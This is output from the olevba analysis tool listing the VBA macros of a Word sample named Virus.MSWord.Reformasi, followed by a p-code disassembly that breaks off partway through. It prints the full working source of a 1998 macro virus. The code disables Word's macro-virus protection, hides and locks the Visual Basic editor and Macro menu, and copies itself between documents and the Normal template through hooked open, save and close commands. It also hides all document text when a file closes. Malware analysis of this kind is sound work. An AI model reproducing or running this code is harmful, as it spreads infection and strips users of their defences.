olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Reformasi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Reformasi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FormAbout.frm 
in file: ./Virus.MSWord.Reformasi - OLE stream: 'Macros/VBA/FormAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































Private Sub CommandButton1_Click()
    Unload Me
End Sub

Private Sub CommandButton1_KeyDown(ByVal KeyCode As MSForms.ReturnInteger, ByVal Shift As Integer)
    If Shift = 2 Then
        Unload FormAbout
        FormReformis.Show
    End If
End Sub

Private Sub CommandButton1_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)

End Sub

Private Sub Label1_Click()

End Sub

Private Sub Label1_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    
End Sub

Private Sub Label2_Click()

End Sub

Private Sub Label2_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    Unload Me
    ShowVisualBasicEditor = True
End Sub

Private Sub UserForm_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO FormKunci.frm 
in file: ./Virus.MSWord.Reformasi - OLE stream: 'Macros/VBA/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































Private Sub CommandButton1_Click()
    Unload Me
End Sub
-------------------------------------------------------------------------------
VBA MACRO FormReformis.frm 
in file: ./Virus.MSWord.Reformasi - OLE stream: 'Macros/VBA/FormReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































Private Sub CommandButton1_Click()
    Unload Me
End Sub

Private Sub CommandButton2_Click()
    FormKunci.Show
End Sub

Private Sub Label1_Click()

End Sub

Private Sub Label1_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    Unload FormReformis
    FormAbout.Show
End Sub

Private Sub Label2_Click()

End Sub

Private Sub Label2_DblClick(ByVal Cancel As MSForms.ReturnBoolean)
    Unload FormReformis
    FormAbout.Show
End Sub

Private Sub UserForm_Click()

End Sub

Private Sub UserForm_Initialize()
End Sub

-------------------------------------------------------------------------------
VBA MACRO ModuleReformis.bas 
in file: ./Virus.MSWord.Reformasi - OLE stream: 'Macros/VBA/ModuleReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'==================================================================
' Nama virus             : Virus Reformasi
' Diprogram oleh         : ~Akut Wajuxacqupi~
' Tanggal pembuatan      :  8 Agustus 1998
' Tanggal peluncuran     : 10 Agustus 1998
' Dibuat di              : Jakarta, Indonesia
' Lingkungan             : Microsoft Word Version 8.0 ( MS-Office 97)
'===================================================================
'

Public AlertAsli
Public AkanDisimpan

Sub ReformInisialisasi()
    Application.DisplayAlerts = wdAlertsMessageBox
    AlertAsli = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    WordBasic.DisableAutoMacros 0
    On Error Resume Next
    If Dir("c:\acyond.off", vbHidden) = "" And _
        Year(Date) > 1998 Then
        AutoCorrect.Entries.Add Name:="yond", Value:=" "
    Else
        AutoCorrect.Entries("yond").Delete
    End If
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub

Sub ReformTutup()
    Application.DisplayAlerts = AlertAsli
End Sub

Sub NormKeDok()
    On Error GoTo Keluar
    AkanDisimpan = False
    DokTerkena = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Kesalahan1
    For n = 1 To AD.VBProject.vbcomponents.Count
        nm = AD.VBProject.vbcomponents(n).Name
        If nm = "ModuleReformis" Then DokTerkena = True
        If (nm <> "FormAbout") And (nm <> "FormKunci") And _
           (nm <> "FormReformis") And (nm <> "ModuleReformis") And _
           (nm <> "ThisDocument") And (nm <> "Reference to Normal") Then
           Application.OrganizerDelete Source:=AD.FullName, _
           Name:=nm, Object:=wdOrganizerObjectProjectItems
        End If
    Next n
Kesalahan1:
    If DokTerkena = False Then
        On Error GoTo Kesalahan2
        Application.OrganizerCopy Source:=NT.FullName, _
            Destination:=AD.FullName, Name:="FormAbout", _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NT.FullName, _
            Destination:=AD.FullName, Name:="FormKunci", _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NT.FullName, _
            Destination:=AD.FullName, Name:="FormReformis", _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NT.FullName, _
            Destination:=AD.FullName, Name:="ModuleReformis", _
            Object:=wdOrganizerObjectProjectItems
        ActiveDocument.VBProject.Name = "Reformasi"
        AkanDisimpan = True
Kesalahan2:
    End If
Keluar:
End Sub

Sub DokKeNorm()
    On Error GoTo Keluar2
    NormTerkena = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Kesalahan3
    For n = 1 To NT.VBProject.vbcomponents.Count
        nm = NT.VBProject.vbcomponents(n).Name
        If nm = "ModuleReformis" Then NormTerkena = True
        If (nm <> "FormAbout") And (nm <> "FormKunci") And _
           (nm <> "FormReformis") And (nm <> "ModuleReformis") And _
           (nm <> "ThisDocument") Then
           Application.OrganizerDelete Source:=NT.FullName, _
           Name:=nm, Object:=wdOrganizerObjectProjectItems
        End If
    Next n
Kesalahan3:
    If NormTerkena = False Then
        On Error GoTo Kesalahan4
        Application.OrganizerCopy Source:=AD.FullName, _
            Destination:=NT.FullName, Name:="FormAbout", _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=AD.FullName, _
            Destination:=NT.FullName, Name:="FormKunci", _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=AD.FullName, _
            Destination:=NT.FullName, Name:="FormReformis", _
            Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=AD.FullName, _
            Destination:=NT.FullName, Name:="ModuleReformis", _
            Object:=wdOrganizerObjectProjectItems
        Templates(NT.FullName).Save
Kesalahan4:
    End If
Keluar2:
End Sub

Sub AnginReformasi()
    ReformInisialisasi
    DokKeNorm
    ReformTutup
End Sub

Sub Simpan()
    On Error GoTo Kesalahan5
    If AkanDisimpan = True Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.Name, _
        fileformat:=wdFormatDocument
    End If
Kesalahan5:
End Sub

Sub AutoOpen()
    AnginReformasi
    Selection.WholeStory
    Selection.Font.Hidden = False
    Selection.HomeKey unit:=wdStory
End Sub

Sub FileClose()
    On Error GoTo AdaSalah
    ReformInisialisasi
    DokKeNorm
    NormKeDok
    ReformTutup
    Selection.WholeStory
    Selection.Font.Hidden = True
    If Left(ActiveDocument.Name, 8) <> "Document" Then _
       Application.DisplayAlerts = wdAlertsNone
    ActiveDocument.Close
AdaSalah:
End Sub

Sub FileOpen()
    AnginReformasi
    Dialogs(wdDialogFileOpen).Show
    ReformInisialisasi
    NormKeDok
    Simpan
    ReformTutup
End Sub

Sub FileSaveAs()
    ReformInisialisasi
    DokKeNorm
    NormKeDok
    ReformTutup
    Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub FileSave()
    ReformInisialisasi
    DokKeNorm
    NormKeDok
    ReformTutup
    On Error GoTo Kesalahan6
    If Not ActiveDocument.Saved Then ActiveDocument.Save
Kesalahan6:
End Sub

Sub HelpAbout()
    On Error GoTo Kesalahan7
    FormAbout.Show
Kesalahan7:
End Sub

Sub FileExit()
    On Error GoTo Kesalahan8
    If (Year(Date) > 1998 And WeekDay(Date) = vbFriday And Dir("c:\reform.off", vbHidden) = "") Then FormReformis.Show
    Application.Quit
Kesalahan8:
End Sub

Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    AnginReformasi
End Sub

Sub FileNew()
    AnginReformasi
    Dialogs(wdDialogFileNew).Show
End Sub

Sub FileTemplates()
    AnginReformasi
End Sub

Sub ToolsMacro()
    AnginReformasi
End Sub

Sub ToolsCustomizeKeyboard()
    AnginReformasi
End Sub

Sub ToolsCustomize()
    AnginReformasi
End Sub

Sub ViewVBCode()
    AnginReformasi
    ShowVisualBasicEditor = False
End Sub

Sub Organizer()
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Reformasi
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/FormAbout - 3198 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #32:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #33:
' 	EndSub 
' Line #34:
' Line #35:
' 	FuncDefn (Private Sub CommandButton1_KeyDown(ByVal KeyCode As , ByVal Shift As Integer))
' Line #36:
' 	Ld Shift 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #37:
' 	Ld FormAbout 
' 	ArgsCall Unlock 0x0001 
' Line #38:
' 	Ld FormReformis 
' 	ArgsMemCall Show 0x0000 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndSub 
' Line #41:
' Line #42:
' 	FuncDefn (Private Sub CommandButton1_KeyPress(ByVal KeyAscii As ))
' Line #43:
' Line #44:
' 	EndSub 
' Line #45:
' Line #46:
' 	FuncDefn (Private Sub Label1_Click())
' Line #47:
' Line #48:
' 	EndSub 
' Line #49:
' Line #50:
' 	FuncDefn (Private Sub Label1_DblClick(ByVal Cancel As ))
' Line #51:
' Line #52:
' 	EndSub 
' Line #53:
' Line #54:
' 	FuncDefn (Private Sub Label2_Click())
' Line #55:
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Private Sub Label2_DblClick(ByVal Cancel As ))
' Line #59:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #60:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #61:
' 	EndSub 
' Line #62:
' Line #63:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #64:
' Line #65:
' 	EndSub 
' Macros/VBA/FormKunci - 1706 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #32:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #33:
' 	EndSub 
' Macros/VBA/FormReformis - 2976 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #32:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #33:
' 	EndSub 
' Line #34:
' Line #35:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #36:
' 	Ld FormKunci 
' 	ArgsMemCall Show 0x0000 
' Line #37:
' 	EndSub 
' Line #38:
' Line #39:
' 	FuncDefn (Private Sub Label1_Click())
' Line #40:
' Line #41:
' 	EndSub 
' Line #42:
' Line #43:
' 	FuncDefn (Private Sub Label1_DblClick(ByVal Cancel As ))
' Line #44:
' 	Ld FormReformis 
' 	ArgsCall Unlock 0x0001 
' Line #45:
' 	Ld FormAbout 
' 	ArgsMemCall Show 0x0000 
' Line #46:
' 	EndSub 
' Line #47:
' Line #48:
' 	FuncDefn (Private Sub Label2_Click())
' Line #49:
' Line #50:
' 	EndSub 
' Line #51:
' Line #52:
' 	FuncDefn (Private Sub Label2_DblClick(ByVal Cancel As ))
' Line #53:
' 	Ld FormReformis 
' 	ArgsCall Unlock 0x0001 
' Line #54:
' 	Ld FormAbout 
' 	ArgsMemCall Show 0x0000 
' Line #55:
' 	EndSub 
' Line #56:
' Line #57:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #58:
' Line #59:
' 	EndSub 
' Line #60:
' Line #61:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #62:
' 	EndSub 
' Line #63:
' Macros/VBA/ModuleReformis - 16914 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1:
' 	QuoteRem 0x0000 0x0042 "=================================================================="
' Line #2:
' 	QuoteRem 0x0000 0x0029 " Nama virus             : Virus Reformasi"
' Line #3:
' 	QuoteRem 0x0000 0x002C " Diprogram oleh         : ~Akut Wajuxacqupi~"
' Line #4:
' 	QuoteRem 0x0000 0x0029 " Tanggal pembuatan      :  8 Agustus 1998"
' Line #5:
' 	QuoteRem 0x0000 0x0029 " Tanggal peluncuran     : 10 Agustus 1998"
' Line #6:
' 	QuoteRem 0x0000 0x002C " Dibuat di              : Jakarta, Indonesia"
' Line #7:
' 	QuoteRem 0x0000 0x0044 " Lingkungan             : Microsoft Word Version 8.0 ( MS-Office 97)"
' Line #8:
' 	QuoteRem 0x0000 0x0043 "==================================================================="
' Line #9:
' 	QuoteRem 0x0000 0x0000 ""
' Line #10:
' Line #11:
' 	Dim (Public) 
' 	VarDefn AlertAsli
' Line #12:
' 	Dim (Public) 
' 	VarDefn AkanDisimpan
' Line #13:
' Line #14:
' 	FuncDefn (Sub ReformInisialisasi())
' Line #15:
' 	Ld wdAlertsMessageBox 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #16:
' 	Ld Application 
' 	MemLd DisplayAlerts 
' 	St AlertAsli 
' Line #17:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #18:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #19:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #20:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #21:
' 	EndWith 
' Line #22:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	LineCont 0x0004 0A 00 08 00
' 	LitStr 0x000D "c:\acyond.off"
' 	Ld vbHidden 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07CE 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #25:
' 	LitStr 0x0004 "yond"
' 	ParamNamed New 
' 	LitStr 0x0001 " "
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #26:
' 	ElseBlock 
' Line #27:
' 	LitStr 0x0004 "yond"
' 	Ld AutoCorrect 
' 	ArgsMemLd Entries 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #30:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #31:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #32:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #33:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #34:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #35:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #36:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #37:
' 	OnError (GoTo 0) 
' Line #38:
' 	EndSub 
' Line #39:
' Line #40:
' 	FuncDefn (Sub ReformTutup())
' Line #41:
' 	Ld AlertAsli 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #42:
' 	EndSub 
' Line #43:
' Line #44:
' 	FuncDefn (Sub NormKeDok())
' Line #45:
' 	OnError Keluar 
' Line #46:
' 	LitVarSpecial (False)
' 	St AkanDisimpan 
' Line #47:
' 	LitVarSpecial (False)
' 	St DokTerkena 
' Line #48:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #49:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #50:
' 	OnError Kesalahan1 
' Line #51:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #52:
' 	Ld n 
' 	Ld AD 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd New 
' 	St nm 
' Line #53:
' 	Ld nm 
' 	LitStr 0x000E "ModuleReformis"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St DokTerkena 
' 	EndIf 
' Line #54:
' 	LineCont 0x0008 0D 00 0B 00 19 00 0B 00
' 	Ld nm 
' 	LitStr 0x0009 "FormAbout"
' 	Ne 
' 	Paren 
' 	Ld nm 
' 	LitStr 0x0009 "FormKunci"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nm 
' 	LitStr 0x000C "FormReformis"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nm 
' 	LitStr 0x000E "ModuleReformis"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nm 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nm 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #55:
' 	LineCont 0x0004 09 00 0B 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld nm 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #58:
' 	Label Kesalahan1 
' Line #59:
' 	Ld DokTerkena 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	OnError Kesalahan2 
' Line #61:
' 	LineCont 0x0008 09 00 0C 00 13 00 0C 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "FormAbout"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #62:
' 	LineCont 0x0008 09 00 0C 00 13 00 0C 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "FormKunci"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #63:
' 	LineCont 0x0008 09 00 0C 00 13 00 0C 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "FormReformis"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #64:
' 	LineCont 0x0008 09 00 0C 00 13 00 0C 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000E "ModuleReformis"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #65:
' 	LitStr 0x0009 "Reformasi"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #66:
' 	LitVarSpecial (True)
' 	St AkanDisimpan 
' Line #67:
' 	Label Kesalahan2 
' Line #68:
' 	EndIfBlock 
' Line #69:
' 	Label Keluar 
' Line #70:
' 	EndSub 
' Line #71:
' Line #72:
' 	FuncDefn (Sub DokKeNorm())
' Line #73:
' 	OnError Keluar2 
' Line #74:
' 	LitVarSpecial (False)
' 	St NormTerkena 
' Line #75:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #76:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #77:
' 	OnError Kesalahan3 
' Line #78:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #79:
' 	Ld n 
' 	Ld NT 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd New 
' 	St nm 
' Line #80:
' 	Ld nm 
' 	LitStr 0x000E "ModuleReformis"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormTerkena 
' 	EndIf 
' Line #81:
' 	LineCont 0x0008 0D 00 0B 00 19 00 0B 00
' 	Ld nm 
' 	LitStr 0x0009 "FormAbout"
' 	Ne 
' 	Paren 
' 	Ld nm 
' 	LitStr 0x0009 "FormKunci"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nm 
' 	LitStr 0x000C "FormReformis"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nm 
' 	LitStr 0x000E "ModuleReformis"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld nm 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #82:
' 	LineCont 0x0004 09 00 0B 00
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld nm 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #85:
' 	Label Kesalahan3 
' Line #86:
' 	Ld NormTerkena 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #87:
' 	OnError Kesalahan4 
' Line #88:
' 	LineCont 0x0008 09 00 0C 00 13 00 0C 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "FormAbout"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #89:
' 	LineCont 0x0008 09 00 0C 00 13 00 0C 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "FormKunci"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #90:
' 	LineCont 0x0008 09 00 0C 00 13 00 0C 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000C "FormReformis"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #91:
' 	LineCont 0x0008 09 00 0C 00 13 00 0C 00
' 	Ld AD 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NT 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000E "ModuleReformis"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #92:
' 	Ld NT 
' 	MemLd FullName 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #93:
' 	Label Kesalahan4 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	Label Keluar2 
' Line #96:
' 	EndSub 
' Line #97:
' Line #98:
' 	FuncDefn (Sub AnginReformasi())
' Line #99:
' 	ArgsCall ReformInisialisasi 0x0000 
' Line #100:
' 	ArgsCall DokKeNorm 0x0000 
' Line #101:
' 	ArgsCall ReformTutup 0x0000 
' Line #102:
' 	EndSub 
' Line #103:
' Line #104:
' 	FuncDefn (Sub Simpan())
' Line #105:
' 	OnError Kesalahan5 
' Line #106:
' 	Ld AkanDisimpan 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #107:
' 	LineCont 0x0004 09 00 08 00
' 	Ld ActiveDocument 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	Label Kesalahan5 
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' 	FuncDefn (Sub AutoOpen())
' Line #113:
' 	ArgsCall AnginReformasi 0x0000 
' Line #114:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #115:
' 	LitVarSpecial (False)
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Hidden 
' Line #116:
' 	Ld wdStory 
' 	ParamNamed unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #117:
' 	EndSub 
' Line #118:
' Line #119:
' 	FuncDefn (Sub FileClose())
' Line #120:
' 	OnError AdaSalah 
' Line #121:
' 	ArgsCall ReformInisialisasi 0x0000 
' Line #122:
' 	ArgsCall DokKeNorm 0x0000 
' Line #123:
' 	ArgsCall NormKeDok 0x0000 
' Line #124:
' 	ArgsCall ReformTutup 0x0000 
' Line #125:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #126:
' 	LitVarSpecial (True)
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Hidden 
' Line #127:
' 	LineCont 0x0004 0C 00 07 00
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' 	EndIf 
' Line #128:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #129:
' 	Label AdaSalah 
' Line #130:
' 	EndSub 
' Line #131:
' Line #132:
' 	FuncDefn (Sub FileOpen())
' Line #133:
' 	ArgsCall AnginReformasi 0x0000 
' Line #134:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #135:
' 	ArgsCall ReformInisialisasi 0x0000 
' Line #136:
' 	ArgsCall NormKeDok 0x0000 
' Line #137:
' 	ArgsCall Simpan 0x0000 
' Line #138:
' 	ArgsCall ReformTutup 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' Line #141:
' 	FuncDefn (Sub FileSaveAs())
' Line #142:
' 	ArgsCall ReformInisialisasi 0x0000 
' Line #143:
' 	ArgsCall DokKeNorm 0x0000 
' Line #144:
